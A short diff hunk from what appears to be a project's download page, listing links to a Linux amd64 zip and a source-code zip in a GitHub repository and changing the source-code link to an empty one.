@@ -14,4 +14,4 @@ Oct/21/2025
 
 *[Linux](https://github.com/Mars-Gor/Portfolio_CompProgram/raw/refs/heads/main/src/linux-amd64.zip)
 
-*[SourceCode](https://github.com/Mars-Gor/Portfolio_CompProgram/raw/refs/heads/main/src/Calculator.zip)
+*[SourceCode]()
